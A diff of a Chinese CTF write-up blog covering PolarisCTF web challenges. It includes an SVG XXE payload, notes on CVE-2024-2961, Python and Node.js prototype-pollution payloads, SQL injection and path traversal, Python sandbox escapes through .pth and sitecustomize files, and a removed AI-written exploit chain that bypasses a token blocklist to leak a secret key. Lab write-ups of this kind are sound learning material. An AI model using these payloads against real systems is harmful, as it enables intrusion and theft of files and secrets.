@@ -1,12 +1,15 @@
 ---
 title: PolarisCTF
-date: 2026-03-29 10:25:01
+date: 2026-04-28 21:16:47
 tags:
-index_img: https://gitee.com/bobrocket/img/raw/master/image-20260331151901097.png
 categories: CTF
 ---
 
+当时做的时候大部分题都是用ai做的，没学到什么东西，但是题目质量还是很高的，看到平台上有复现环境了，决定不用agent自己做一遍
+
 ## only real
+
+考点：jwt伪造
 
 #### 非预期
 
@@ -27,29 +30,47 @@ foreach($cmd_chars as $ascii){
 @$func($cmd);
 ```
 
-## Broken Trust
+## 头像上传器
 
-一个登录界面，注册可以获取UID，进去发现有管理员工具，推测需要拿到管理员权限
+考点：SVG XXE，CVE-2024-2961
 
-查看源代码发现一个UID查询的api接口
+一个上传头像的页面，白名单的后缀校验，并且文件重命名，不好绕过
 
-![image-20260329131243258](https://gitee.com/bobrocket/img/raw/master/image-20260329131243258.png)
+头像的位置有渲染但不是文件包含，支持的格式有svg，尝试一下svg xxe
 
-测试SQL注入
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+```
+
+成功读到文件了，但是要实现RCE执行`/readflag`，这里需要打CVE-2024-2961
+
+>事实上，CVE-2024-2961 的 sink 点不在于文件包含，而在于 php 伪协议。基本原理是利用 php 伪协议调用 iconv 函数，通过字符集 `ISO-2022-CN-EXT` 的特性将三字节字符解码为四字节，从而造成缓冲区的溢出。
+>
+>如果能够配合可读取的文件，就能获取到 PHP 堆地址和 libc，然后得到 system 函数的地址打 rce
+
+这里还是老方法，读map，libc然后用脚本生成链子，但是svg上传之后解析会报错
+
+>`php://filter` 是作为外部实体的 SYSTEM 标识符传入 `DOMDocument::load()`，因此它首先要经过 libxml 的 URI 解析，而不是直接进入 PHP 用户态流处理。| 在这种 URI 语境下不属于稳定、规范的路径分隔字符，容易在外部实体解析阶段被拒绝、归一化或导致后续路径解释异常，从而使整条 filter chain 无法原样传递给底层 stream wrapper。因此需要改用 `/`，让 payload 同时满足 URI 语法和 php://filter 的路径式解析规则。
+
+好吧，我们改一下格式，并且不url编码
 
 ```
-{"uid":"'or '1'='1"}
+/readflag > /var/www/html/uploads/1.txt
 ```
 
-成功查询到了admin的UID
+这个题最终未解决的点就是用kezibei师傅的脚本最终只能在uploads目录下写文件，并且没法直接访问，必须curl才能出结果
 
-管理员可以读取文件，我们用路径遍历读flag
-
-```
-/api/admin?action=backup&file=....//....//....//....//flag
-```
+但是网上改的cnext脚本是可以实现任意写文件的
 
 ## ez_python
+
+考点：python原型链污染
 
 ```python
 from flask import Flask, request
@@ -97,15 +118,31 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
 ```
 
-简单的原型链污染，直接污染config下的filename
+非常简单的一个python原型链污染，可以污染filename也可以污染全局变量
 
-```json
+```
 {"config":{"filename":"/flag"}}
 ```
 
-访问/read即可
+```
+{"__init__":{"__globals__":{"__file__":"/flag"}}}
+```
+
+## Broken Trust
+
+考点：SQL注入
+
+查看源代码，发现一个查询uid的api接口，测试一下sql注入，admin的uid就出来了
+
+![image-20260506193205476](https://gitee.com/bobrocket/img/raw/master/image-20260506193205476.png)
+
+admin可以备份文件，通过路径穿越读flag
+
+![image-20260506193236557](https://gitee.com/bobrocket/img/raw/master/image-20260506193236557.png)
 
 ## ezpollute
+
+考点：nodejs原型链污染，nodejs命令行选项
 
 ```js
 const express = require('express');
@@ -118,7 +155,7 @@ app.use(express.static(__dirname));
 
 function merge(target, source, res) {
     for (let key in source) {
-        if (key === '__proto__') {
+        if (key === '__proto__') { //试图防止原型链污染
             if (res) {
                 res.send('get out!');
                 return;
@@ -139,10 +176,10 @@ let config = {
     theme: "default"
 };
 
-app.post('/api/config', (req, res) => {
+app.post('/api/config', (req, res) => { //配置修改接口
     let userConfig = req.body;
 
-    const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];
+    const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline']; //过滤关键字
     const bodyStr = JSON.stringify(userConfig).toLowerCase();
     for (let word of forbidden) {
         if (bodyStr.includes(`"${word}"`)) {
@@ -151,17 +188,17 @@ app.post('/api/config', (req, res) => {
     }
 
     try {
-        merge(config, userConfig, res);
+        merge(config, userConfig, res); 
         res.json({ status: "success", msg: "Configuration updated successfully." });
     } catch (e) {
         res.status(500).json({ status: "error", message: "Internal Server Error" });
     }
 });
 
-app.get('/api/status', (req, res) => {
+app.get('/api/status', (req, res) => { //系统状态接口
 
     const customEnv = Object.create(null);
-    for (let key in process.env) {
+    for (let key in process.env) {//process 是 Node.js 的一个全局对象,而 env 是它上面的一个属性，包含了当前操作系统环境的所有变量
         if (key === 'NODE_OPTIONS') {
             const value = process.env[key] || "";
 
@@ -175,9 +212,9 @@ app.get('/api/status', (req, res) => {
         customEnv[key] = process.env[key];
     }
     
-    const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
+    const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], { //简单来说，spawn 的作用是在你的主程序之外，启动一个新的命令行进程来执行任务。
         env: customEnv,
-        shell: false 
+        shell: false  //不使用系统shell
     });
     
     let output = '';
@@ -202,218 +239,40 @@ app.listen(3000, '0.0.0.0', () => {
 });
 ```
 
-主要有两个api接口
+也就是说一个接口可以进行原型链污染，一个接口可以加载命令行进程
 
-- /api/config 接口存在自定义的 merge 函数，用于合并用户配置。
-- /api/status 接口会启动一个 node 子进程，并手动构建 customEnv 环境变量。
+虽然禁用了`__proto__`但是`target["constructor"]["prototype"] `同样可以访问到 Object 的原型
 
-漏洞点：/api/config使用 Node.js 的 `child_process` 模块来启动一个新的子进程,并且加载了环境变量，而这个变量NODE_OPTIONS是可污染的，正则过滤仅检查了--，而我们可以用-r来加载flag
+那么最终的命令执行要落在spawn上，应该如何污染？
 
-虽然没merge函数禁用了prototype但是在 Node.js 中，可以通过 constructor.prototype 污染全局 Object.prototype。
+#### 补充：NODE_OPTIONS和nodejs命令行选项
 
-在/api/config污染：
+`NODE_OPTIONS` 是一个极其强大的环境变量，它允许你将 Node.js 的命令行参数预设在环境里。这意味着，无论你是通过 `node app.js` 还是通过 `npm start` 启动程序，这些参数都会自动生效。
+
+在安全领域（如 CTF），它是实现 RCE（远程代码执行） 的最常用跳板。
+
+Node.js 命令行选项：全称与缩写对照表
+
+| **全称**        | **缩写** | **作用说明**                                        | **CTF 利用场景**                                      |
+| --------------- | -------- | --------------------------------------------------- | ----------------------------------------------------- |
+| `--require`     | `-r`     | 启动前强制预加载模块。                              | **最高频**。用于加载恶意脚本或 `/proc/self/environ`。 |
+| `--eval`        | `-e`     | 运行字符串代码。                                    | 直接执行 JS 命令，不加载脚本文件。                    |
+| `--print`       | `-p`     | 运行代码并打印结果（相当于 `-e` + `console.log`）。 | 快速回显执行结果。                                    |
+| `--version`     | `-v`     | 查看版本。                                          | 探测环境信息。                                        |
+| `--interactive` | `-i`     | 进入交互式 REPL 模式。                              | 维持一个可交互的 Shell。                              |
+| `--check`       | `-c`     | 语法检查但不执行。                                  | 较少用于攻击，常用于调试。                            |
+
+那么利用链就清楚了，我们需要污染NODE_OPTIONS，用-r预加载flag
 
 ```
 {"constructor":{"prototype":{"NODE_OPTIONS":"-r /flag"}}}
 ```
 
-- `NODE_OPTIONS`
-  这是一个特殊的环境变量。Node.js 在启动时会读取这个变量的值，并将其内容当作命令行参数来处理。这使得开发者可以在不修改启动命令的情况下，为 Node.js 进程传递全局配置。
-- `-r` (或 `--require`)
-  这是 Node.js 的一个命令行选项。它的作用是在执行主程序代码之前，**预加载（require）** 指定的模块或文件。被预加载的文件会优先于你的应用代码执行。
-
-进入/api/status,由于/flag的内容不符合js的语法规范，于是就会在报错里面吐出来
-
-![image-20260330165328425](https://gitee.com/bobrocket/img/raw/master/image-20260330165328425.png)
-
-
-
-## AutoPypy
-
-一个python沙箱，主要有两个功能，上传代码和执行代码
-
-我们先探测一下环境
-
-```python
-import sys
-import os
-
-print("Python version:", sys.version)
-print("Current dir:", os.getcwd())
-print("List files:", os.listdir('.'))
-print("ENV:", dict(os.environ))
-```
-
-从输出中发现：
-
-- Python 版本: 3.10.19
-- 当前目录: `/app`
-- 环境变量中有 `KUBERNETES_SERVICE_HOST=unix:///var/run/docker.sock`，说明运行在 Kubernetes/Docker 环境中
-
-我们尝试经典的沙箱逃逸
-
-通过 `__subclasses__` 获取 `os._wrap_close` 类：
-
-```python
-classes = (()).__class__.__bases__[0].__subclasses__()
-_wrap_close = classes[138]  # os._wrap_close
-popen = _wrap_close.__init__.__globals__['popen']
-```
-
-成功获取了 `popen` 函数，可以执行系统命令。
-
-尝试读取 `/app/run.py` 文件，发现无论使用什么路径 (`/app/run.py`, `../app/run.py`, `./run.py` 等)，读取到的内容都是我们上传的代码本身。
-
-这说明沙箱使用了某种 **overlay 文件系统** 或 **bind mount** 机制，劫持了对 `/app/run.py` 的访问。
-
-### 方法一
-
-尝试连接本地端口，发现端口 5000 开放（Flask 应用端口）：
-
-```python
-import socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-result = sock.connect_ex(('127.0.0.1', 5000))
-# Port 5000 is open
-```
-
-通过 socket 直接发送 HTTP 请求到本地 Flask 应用：
-
-```python
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(('127.0.0.1', 5000))
-request = b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
-sock.send(request)
-```
-
-发现 `/run` 端点接受 POST 请求，参数为 JSON 格式的 `{"filename": "xxx.py"}`。
-
-尝试通过 `/run` 端点读取不同路径的文件：
-
-```python
-import json
-body = json.dumps({"filename": "../../flag"})
-request = f"POST /run HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}"
-```
-
-当尝试 `../../flag` 或 `/flag` 时，服务器返回了错误信息：
-
-```python
-Launching sandbox...
-ok
-  File "/app/run.py", line 1
-    xmctf{699f4568de00f2df35f98005567398d3}
-            ^
-SyntaxError: invalid syntax
-```
-
-exp:
-
-```python
-import requests
-
-base_url = "http://5000-f71ed300-8492-40f2-aa41-da09de3089db.challenge.ctfplus.cn/"
-
-# 利用路径遍历读取 flag
-code = '''
-def http_post_json(filename):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(5)
-    sock.connect(('127.0.0.1', 5000))
-    
-    body = json.dumps({"filename": filename})
-    content_length = len(body)
-    request = f"POST /run HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: {content_length}\\r\\n\\r\\n{body}".encode()
-    
-    sock.send(request)
-    response = b""
-    while True:
-        chunk = sock.recv(4096)
-        if not chunk:
-            break
-        response += chunk
-    sock.close()
-    return response.decode()
-
-# 读取 flag
-response = http_post_json("../../flag")
-print(response)
-'''
-
-files = {'file': ('exploit.py', code.encode())}
-data = {'filename': 'exploit.py'}
-
-# 上传
-r = requests.post(f"{base_url}/upload", files=files, data=data)
-print("Upload:", r.text)
-
-# 执行
-r = requests.post(f"{base_url}/run", json={"filename": "exploit.py"})
-print("Run:", r.json())
-```
-
-### 方法二
-
-系统通过 launcher.py 调用 proot 来运行 Python 脚本。虽然 proot 限制了 /app/run.py 的执行环境，但 **launcher.py** **本身是在宿主机环境运行的**。 server.py 调用方式如下：
-
-```
-proc = subprocess.run(
-            [sys.executable, launcher_path, target_file],
-            capture_output=True,
-            text=True,
-            timeout=5,
-            cwd=BASE_DIR 
-        )
-```
-
-这意味着 sys.executable（宿主机的 Python 解释器）在启动时会加载宿主机的环境配置。
-
-Python 在初始化阶段，会扫描 site-packages 目录下的所有 .pth 文件。如果 .pth 文件中包含以 import 开头的行，Python 会在启动过程中执行该行代码。这是一个隐蔽的 RCE（远程代码执行）点。
-
-利用 /upload 接口，将恶意代码写入该目录下的一个 .pth 文件中
-
-`../../../../../usr/local/lib/python3.10/site-packages/pwn.pth`
-
-```python
-import os; print(os.popen('cat /flag').read()); import sys; sys.exit(0)
-```
-
-![image-20260330185300808](https://gitee.com/bobrocket/img/raw/master/image-20260330185300808.png)
-
-### 方法三
-
-上传的 py 文件可以任意写，我们利用 sitecustomize 的自动加载机制运行代码
-
-py 文件写成这样上传
-
-```python
-import os,sys,subprocess
-print(subprocess.getoutput('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /app/flag.txt 2>/dev/null')) # 尝试用shell读取各种路径的flag
-sys.stdout.flush();os._exit(0)
-```
-
-这里命名用 /usr/local/lib/python3.10/site-packages/sitecustomize.py
-
-服务器启动时会 import site，顺便 import 这个包，代码就会在沙箱启动前执行
-
 ## DXT
 
-首先我们要搞清楚什么是MCP
+考点：恶意DXT
 
-### 🤖 Model Context Protocol (模型上下文协议)
-
-这是一个在人工智能（AI）领域，特别是大模型应用开发中非常热门的概念。
-
-你可以把它想象成 AI 领域的 **“USB-C 接口”**。就像 USB-C 接口让各种电子设备能用统一的线缆连接和充电一样，MCP 是一个标准化的协议，旨在解决大模型与外部数据、工具和服务之间的连接问题。
-
-- **核心目的**：让 AI 模型能够以统一、标准化的方式，去发现和调用各种外部能力，比如读取数据库、访问文件系统、调用第三方 API 等。
-- **解决的问题**：在 MCP 出现之前，开发者为 AI 模型接入每一个新工具都需要编写一套特定的适配代码，过程繁琐且难以复用。MCP 通过定义一套通用协议，极大地简化了这一过程，降低了开发门槛和成本。
-- **主要构成**：它通常采用客户端-服务器（Client-Server）架构，主要包括：
-  1. **MCP 主机 (Host)**：运行 AI 模型的应用程序，例如 AI 助手、IDE 插件等。
-  2. **MCP 客户端 (Client)**：内嵌在主机中，负责与 MCP 服务器通信。
-  3. **MCP 服务器 (Server)**：一个轻量级程序，用于向 AI 模型暴露特定的工具、数据或资源。
-
-那么dxt是个什么文件？
+dxt是个什么文件？
 
 Desktop Extensions (DXT，桌面扩展) 是一种用于打包和分发本地MCP (Model Context Protocol) 服务器的标准化格式。它类似于Chrome扩展(.crx)或VS Code扩展(.vsix)，允许用户通过单次点击安装本地MCP服务器。
 
@@ -455,392 +314,216 @@ Desktop Extensions (DXT，桌面扩展) 是一种用于打包和分发本地MCP 
 
 ![image-20260331190511502](https://gitee.com/bobrocket/img/raw/master/image-20260331190511502.png)
 
-## 醉里挑灯看剑
+## AutoPypy
 
-源码太长加上不会TS审起来有点困难，这里先贴一个ai的wp
+考点：python沙箱逃逸
 
-### 题目信息
+一共两个功能，上传代码和运行代码，我们先来看主程序server.py
 
-- **题目名称**: Workflow Service
-- **题目描述**: "谁知道呢，他们说ts是世界上最好的语言"
-- **服务地址**: `http://80-881b111e-485f-42db-8fda-591706498a05.challenge.ctfplus.cn/`
-- **附件**: `server.ts` (Bun + TypeScript 服务端代码)
+```python
+import os
+import sys
+import subprocess
+from flask import Flask, request, render_template, jsonify
 
-### 题目分析
+app = Flask(__name__)
 
-#### 服务架构
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
 
-这是一个基于 Bun 运行时的 TypeScript Web 服务，提供以下 API 端点：
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
 
-| 端点 | 方法 | 功能 |
-|------|------|------|
-| `/api/auth/guest` | POST | 获取访客 Token |
-| `/api/caps/sync` | POST | 同步能力快照 (guest only) |
-| `/api/session/self` | GET | 查看当前会话信息 |
-| `/api/release/execute` | POST | 执行表达式 (需要 maintainer + release 权限) |
-| `/api/release/challenge` | POST | 获取挑战 nonce |
-| `/api/release/claim` | POST | 提交 proof 获取 FLAG |
 
-#### 目标
+@app.route('/')
+def index():
+    return render_template("index.html")
 
-获取 FLAG 需要满足以下条件：
-1. 拥有 `maintainer` + `release` 权限
-2. Session 角色必须是 `guest`
-3. 提交正确的 `proof = SHA1(sid:nonce:RUNNER_KEY)`
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'file' not in request.files:
+        return 'No file part', 400
+    
+    file = request.files['file']
+    filename = request.form.get('filename') or file.filename #存在目录穿越漏洞
+    
+    save_path = os.path.join(UPLOAD_FOLDER, filename)
+    
+    save_dir = os.path.dirname(save_path)
+    if not os.path.exists(save_dir):
+        try:
+            os.makedirs(save_dir)
+        except OSError:
+            pass
 
----
+    try:
+        file.save(save_path)
+        return f'成功上传至: {save_path}'
+    except Exception as e:
+        return f'上传失败: {str(e)}', 500
 
-### 漏洞挖掘
+@app.route('/run', methods=['POST'])
+def run_code():
+    data = request.get_json()
+    filename = data.get('filename')
 
-#### 漏洞一：权限提升 (SQL COALESCE + NULL 注入)
+    target_file = os.path.join('/app/uploads', filename) #执行的源码
 
-**漏洞代码位置**: `normalizeSyncRows` 函数 (第 598-614 行)
+    launcher_path = os.path.join(BASE_DIR, 'launcher.py') #沙箱
 
-```typescript
-const keepRole = input.keepRole !== false;
-const keepLane = input.keepLane !== false;
+    try:
+        proc = subprocess.run(
+            [sys.executable, launcher_path, target_file],
+            capture_output=True,
+            text=True,
+            timeout=5,
+            cwd=BASE_DIR 
+        )
+        return jsonify({"output": proc.stdout + proc.stderr})
+    except subprocess.TimeoutExpired:
+        return jsonify({"output": "Timeout"})
 
-const row: Record<string, unknown> = {
-  sid: claims.sid,
-  source,
-  note,
-  stamp: now + i
-};
-
-if (keepRole) {
-  row.role = 'guest';
-}
-
-if (keepLane) {
-  row.lane = 'public';
-}
+if __name__ == '__main__':
+    import site
+    print(f"[*] Server started.")
+    print(f"[*] Upload Folder: {UPLOAD_FOLDER}")
+    print(f"[*] Target site-packages (Try to reach here): {site.getsitepackages()[0]}") #提示！！！
+    app.run(host='0.0.0.0', port=5000)
 ```
 
-**问题分析**:
-- 当 `keepRole: false` 时，`row.role` 不会被设置
-- 当 `keepLane: false` 时，`row.lane` 不会被设置
-- 数据库插入时，这些字段会存储为 **NULL**
+我们再来看沙箱launcher.py
 
-**权限检查逻辑** (`getEffectiveCapability` 函数):
+```python
+import subprocess
+import sys
 
-```sql
-SELECT
-  COALESCE(role, 'maintainer') AS role,
-  COALESCE(lane, 'release') AS lane,
-  ...
-FROM capability_snapshots
-WHERE sid = ${sid}
-ORDER BY id DESC
-LIMIT 1
-```
-
-**关键漏洞**: `COALESCE(NULL, 'maintainer')` 返回 `'maintainer'`！
-
-这意味着我们可以通过注入 NULL 值，让数据库默认将权限提升为 `maintainer` + `release`。
-
----
-
-#### 漏洞二：表达式沙箱绕过 (字符串拼接)
-
-**漏洞代码位置**: `lintExpression` 函数 (第 640-655 行)
-
-```typescript
-const BLOCKED_EXPRESSION_TOKENS = [
-  'process',
-  'globalthis',
-  'constructor',
-  'function',
-  'require',
-  'import',
-  'fetch',
-  'bun',
-  'http',
-  'spawn',
-  'eval',
-  'node:',
-  'child_process',
-  'websocket'
-] as const;
-
-function lintExpression(expr: string): void {
-  const lowered = expr.toLowerCase();
-  for (const token of BLOCKED_EXPRESSION_TOKENS) {
-    if (lowered.includes(token)) {
-      throw new Error(`expression contains blocked token: ${token}`);
-    }
-  }
-}
-```
-
-**问题分析**:
-- 黑名单检测使用 `includes()` 进行字符串匹配
-- 但 JavaScript 支持字符串拼接和属性访问器语法
-
-**绕过方式**:
-```javascript
-[].filter['constru'+'ctor']('return this')()['pro'+'cess'].env.RUNNER_KEY
-```
-
-这个表达式：
-1. `[]` 创建空数组
-2. `.filter` 访问数组的 filter 方法
-3. `['constru'+'ctor']` 通过字符串拼接绕过黑名单，访问 `constructor`
-4. `('return this')()` 创建并执行函数返回全局对象
-5. `['pro'+'cess']` 再次绕过黑名单访问 `process`
-6. `.env.RUNNER_KEY` 获取环境变量中的密钥
-
----
-
-### 攻击流程
-
-#### Step 1: 获取 Guest Token
-
-```bash
-curl -X POST "http://target/api/auth/guest"
-```
-
-**响应**:
-```json
-{
-  "ok": true,
-  "token": "eyJleHAiOjE3NzQ3NTE4MTM3NzMs...",
-  "claims": {
-    "sid": "sid_554533c1f790",
-    "role": "guest",
-    ...
-  }
-}
-```
-
-#### Step 2: 注入 NULL 权限
-
-```bash
-curl -X POST "http://target/api/caps/sync" \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "ops": [
-      {"source": "test1", "keepRole": false, "keepLane": false},
-      {"source": "test2", "keepRole": false, "keepLane": false}
+def run_sandbox(script_name):
+    print("Launching sandbox...")
+    cmd = [
+        'proot',
+        '-r', './jail_root', #设置沙箱根目录
+        '-b', '/bin',
+        '-b', '/usr',
+        '-b', '/lib',
+        '-b', '/lib64',
+        '-b', '/etc/alternatives',
+        '-b', '/dev/null',
+        '-b', '/dev/zero',
+        '-b', '/dev/urandom',
+        '-b', f'{script_name}:/app/run.py',
+        '-w', '/app',
+        'python3', 'run.py'
     ]
-  }'
+    subprocess.call(cmd)
+    print("ok")
+
+if __name__ == "__main__":
+    script = sys.argv[1]
+    run_sandbox(script)
 ```
 
-**关键点**: 设置 `keepRole: false` 和 `keepLane: false`，让 role/lane 字段为 NULL。
+也就是说这里的沙箱并没有禁用什么函数，但是隔离出了一个小黑屋，在里面执行代码访问不到外面的文件
 
-**验证权限提升**:
-```bash
-curl "http://target/api/session/self" -H "Authorization: Bearer <token>"
-{
-  "recentCaps": [
-    {
-      "id": 22,
-      "role": null,    // NULL 会被 COALESCE 转换为 'maintainer'
-      "lane": null,    // NULL 会被 COALESCE 转换为 'release'
-      "source": "test2"
-    }
-  ]
-}
+### 非预期：直接读
+
+执行源码的地方也有目录穿越漏洞，我们直接尝试执行../../flag或者/flag
+
+![image-20260507101113731](https://gitee.com/bobrocket/img/raw/master/image-20260507101113731.png)
+
+### 预期解：在site-packages下写.pth
+
+`site-packages` 是 Python 中用于存放第三方模块和库的标准目录。Python 在初始化阶段，会扫描 site-packages 目录下的所有 .pth 文件。如果 .pth 文件中包含以 import 开头的行，Python 会在启动过程中执行该行代码。这是一个隐蔽的 RCE（远程代码执行）点。
+
+系统通过 launcher.py 调用 proot 来运行 Python 脚本。虽然 proot 限制了 /app/run.py 的执行环境，但 **launcher.py** **本身是在宿主机环境运行的**。 server.py 调用方式如下：
+
+```python
+proc = subprocess.run(
+            [sys.executable, launcher_path, target_file],
+            capture_output=True,
+            text=True,
+            timeout=5,
+            cwd=BASE_DIR 
+        )
 ```
 
-#### Step 3: 绕过表达式过滤获取 RUNNER_KEY
+这意味着 sys.executable（宿主机的 Python 解释器）在启动时会加载宿主机的环境配置。
 
-```bash
-curl -X POST "http://target/api/release/execute" \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "expression": "[].filter[\"constru\"+\"ctor\"](\"return this\")()[\"pro\"+\"cess\"].env.RUNNER_KEY",
-    "input": {}
-  }'
+利用 /upload 接口，将恶意代码写入该目录下的一个 .pth 文件中`../../../../../usr/local/lib/python3.10/site-packages/suny.pth`
+
+```python
+import os; print(os.popen('cat /flag').read());
 ```
 
-**响应**:
-```json
-{
-  "ok": true,
-  "cap": {
-    "role": "maintainer",
-    "lane": "release"
-  },
-  "result": "VHk74Q3dnKezCzdmIN4Hq3gnXWOCoVVFDoGb7ZWu"
-}
+这样随便执行一段代码就把flag带出来了
+
+### 预期解： sitecustomize 自动加载机制
+
+![image-20260507141846540](https://gitee.com/bobrocket/img/raw/master/image-20260507141846540.png)
+
+上传的 py 文件可以任意写，我们利用 sitecustomize 的自动加载机制运行代码
+
+py 文件写成这样上传
+
+```python
+import os,sys,subprocess
+print(subprocess.getoutput('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /app/flag.txt 2>/dev/null')) # 尝试用shell读取各种路径的flag
+sys.stdout.flush();os._exit(0)
 ```
 
-成功获取 `RUNNER_KEY`！
+这里命名用 /usr/local/lib/python3.10/site-packages/sitecustomize.py
 
-#### Step 4: 获取 Challenge Nonce
+服务器启动时会 import site，顺便 import 这个包，代码就会在沙箱启动前执行
 
-```bash
-curl -X POST "http://target/api/release/challenge" \
-  -H "Authorization: Bearer <token>"
-```
+## Not a node
 
-**响应**:
-```json
-{
-  "ok": true,
-  "sid": "sid_554533c1f790",
-  "nonce": "f2bd2267a179f8685a8d1724",
-  "formula": "sha1(sid + \":\" + nonce + \":\" + releaseSecret)"
-}
-```
+以前没接触过这种js沙箱，我们完整走一遍流程
 
-#### Step 5: 计算 Proof
+题目说是一个安全的js沙箱
 
-根据公式 `proof = SHA1(sid:nonce:RUNNER_KEY)`:
+![image-20260507211720997](https://gitee.com/bobrocket/img/raw/master/image-20260507211720997.png)
 
-```bash
-echo -n "sid_554533c1f790:f2bd2267a179f8685a8d1724:VHk74Q3dnKezCzdmIN4Hq3gnXWOCoVVFDoGb7ZWu" | sha1sum
-# 115c8c4be6c05d6078dceccf40d3a78e976b870e
-```
+我们来了解一下BunEdge
 
-#### Step 6: 提交 Proof 获取 FLAG
+![image-20260507211904717](https://gitee.com/bobrocket/img/raw/master/image-20260507211904717.png)
 
-```bash
-curl -X POST "http://target/api/release/claim" \
-  -H "Authorization: Bearer <token>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "nonce": "f2bd2267a179f8685a8d1724",
-    "proof": "115c8c4be6c05d6078dceccf40d3a78e976b870e"
-  }'
-```
-
-**响应**:
-
-```json
-{
-  "ok": true,
-  "sid": "sid_554533c1f790",
-  "flag": "XMCTF{3d386f6d-0b10-4c73-b451-b879d7d2bd6e}"
-}
-```
-
-## Not a Node
-
-### 前置知识
-
-#### 使用Error.prepareStackTrace技巧
-
-这是一个**V8/JSC引擎的特性**，用于自定义错误堆栈的显示方式。
-
-```javascript
-// 定义自定义的堆栈格式化函数
-Error.prepareStackTrace = function(error, stack) {
-    // error: 错误对象
-    // stack: CallSite对象数组，包含调用栈信息
-    return "custom stack";
-};
-
-// 触发一个错误来测试
-try {
-    throw new Error("test");
-} catch (e) {
-    console.log(e.stack);
-}
-```
-
-**原理**：当JavaScript引擎准备显示错误堆栈时，会调用`Error.prepareStackTrace`函数。通过修改这个函数，我们可以在错误发生时执行自定义代码。
-
-#### 获取全局对象
-
-使用`(0, eval)("this")`技巧：
-
-```javascript
-// (0, eval) 将eval作为普通函数调用，而不是直接调用
-// "this" 在eval中指向全局对象
-let global = (0, eval)("this");
-console.log(global);
-```
-
-**为什么这样写？**
-
-- `(0, eval)`是JavaScript的一个技巧，确保eval在全局作用域执行
-
-**格式？**
-
-```
-(0, eval)
-(1, eval)
-(null, eval)
-('', eval)
-[eval][0]
-window.eval		#浏览器中
-global.eval		#node.js中
-```
-
-#### 关于JSC
-
-**JSC = JavaScriptCore**
-
-是 Safari / 边缘计算用的浏览器引擎，**无 Node.js 原生 API**
-
-#### 关于Uint8Array
-
-Uint8Array是JavaScript中的**类型化数组**，用于表示8位无符号整数数组。它可以用来处理二进制数据。
+那么示例代码的语法就解释的通了，这是一种特殊的js语法规范，我们来写个helloword试试
 
 ```js
-// 创建一个Uint8Array
-let arr = new Uint8Array([72, 101, 108, 108, 111]);  // "Hello"
-
-// 将字符串转为Uint8Array
-let encoder = new TextEncoder();
-let bytes = encoder.encode("Hello");  // Uint8Array [72, 101, 108, 108, 111]
-
-// 将Uint8Array转回字符串
-let decoder = new TextDecoder();
-let str = decoder.decode(bytes);  // "Hello"
+export default {
+  async fetch(request) {
+    // 直接返回纯文本的 Hello World
+    return new Response("Hello World", {
+      headers: { "Content-Type": "text/plain" }
+    });
+  }
+}
 ```
 
-而二进制数据，一般直接作为原始字节传递，不被当作字符串处理
+下面我们尝试直接用Bun内置的Bun.file() API读flag
 
-### 题目
-
-我们搭建了一个“安全”的在线 JavaScript 运行平台。
-
-你提交的代码会被放进一个精心准备的沙箱中运行，一切看起来很干净
-
-![image-20260401140620175](https://gitee.com/bobrocket/img/raw/master/20260401140627386.png)
-
-### 解
-
-拿到题不会做也没啥想法，跟着ai走一遍学习学习
-
-#### 第一步：信息收集
-
-网站右侧
-
-```
-Fetch API standards fully supported in the JSC sandboxed context.
-#Fetch API 标准在 JSC 沙箱环境中被完全支持。
+```js
+export default {
+  async fetch(request) {
+    // 直接读取当前目录下的 flag 文件（假设文件名叫 flag）
+    const flagFile = Bun.file('./flag');
+    
+    // 将文件内容作为响应直接返回
+    return new Response(flagFile, {
+      headers: { "Content-Type": "text/plain" }
+    });
+  }
+}
 ```
 
-说明无法使用node.js原生api
+部署失败，Bun.file被禁用了。好吧，确实很氨醛
 
-```
-__runtime.hash(str)
-High-performance DJB2 hashing.
+![image-20260507212449564](https://gitee.com/bobrocket/img/raw/master/image-20260507212449564.png)
 
-__runtime.encoding.hexEncode(s)
-e.g. hexEncode("internal") -> 696e7465...
-```
+我们去看看右侧的提示，在工具函数里面有一个`__runtime`，我们去了解一下
 
-泄露使用了`__runtime` 的几个函数
+![image-20260507213448091](https://gitee.com/bobrocket/img/raw/master/image-20260507213448091.png)
 
-```
-Advanced
-The runtime exposes documented APIs through the __runtime global. Platform orchestration may rely on additional internal bindings not listed here.
-#高级
-#运行时通过 __runtime 全局对象暴露已公开的 API。
-#平台调度可能依赖此处未列出的其他内部绑定（方法）。
-```
-
-提示可能利用`__runtime` 的其他函数？
-
-#### 第二步：进一步信息收集找可利用方法
-
-探测runtime中的可用属性，注意由于返回内容包含对象，要使用JSON.stringify处理返回内容，并且需要Object.getOwnPropertyNames获取所有属性（否则函数，下划线开头等属性不会显示）
+我们看看`__runtime`下面有什么可用的属性
 
 ```js
 export default {
@@ -854,13 +537,10 @@ export default {
     }
 };
 
-//回显
